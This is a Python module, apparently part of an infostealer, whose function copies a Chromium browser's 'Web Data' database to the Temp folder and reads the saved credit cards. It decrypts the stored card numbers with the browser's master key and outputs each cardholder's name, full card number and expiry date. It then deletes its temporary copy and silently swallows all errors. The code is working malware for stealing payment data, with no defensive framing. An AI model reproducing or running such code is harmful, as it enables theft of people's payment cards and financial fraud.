import os
import shutil
import sqlite3
from datetime import datetime
from . import user
from . import decrypt_password

def get_credit_cards(path: str, profile: str, master_key):
    try:
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        result = ""
        shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = decrypt_password(row[3], master_key)
            result += f"""
Name Card: {row[0]}
Card Number: {card_number}
Expires:  {row[1]} / {row[2]}
Added: {datetime.fromtimestamp(row[4])}
            
            """

        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
        return result
    except:
        pass